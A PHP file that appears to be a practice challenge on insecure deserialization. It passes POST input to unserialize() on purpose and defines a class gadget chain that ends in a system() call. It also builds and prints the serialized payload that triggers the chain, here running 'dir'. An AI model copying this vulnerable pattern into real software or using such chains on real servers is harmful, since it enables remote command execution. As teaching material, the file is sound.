<?php
highlight_file(__FILE__);
class A{
    public $name;//new C
    public function __construct($name)
    {
        $this->name = $name;
    }
    public function __destruct()
    {
        echo "hello".$this->name . '<br>';
       
    }
}

class B{
    public function eval($cmd) {
        echo "Succes!" . '<br>';
        system($cmd);
        
    }
}

class C{
    public $c;// new D
    public $name;
    public function __toString()
    {
        $this->c->get($this->name);
        return "GG";
    }

    public function get($name)
    {
        die("hellp $name");
    }

}

class D{
    private $func = "system";

    public function get($cmd) {
        call_user_func_array($this->func, $cmd);
    }
}
if(isset($_POST['name'])) {
    $name = unserialize($_POST['name']);
}
echo "BYE" . '<br>';
// var_dump($name);
$a = new A(new C);
$a -> name -> c = new D;
$a -> name -> name = array(0=>"dir",1=>"");
// // var_dump($a);
echo serialize($a);
echo urlencode(serialize($a));
// $a = "system";
// $b[] = "dir";
// call_user_func_array($a,$b);
// system("dir");

//B <-- D <-- C <-- A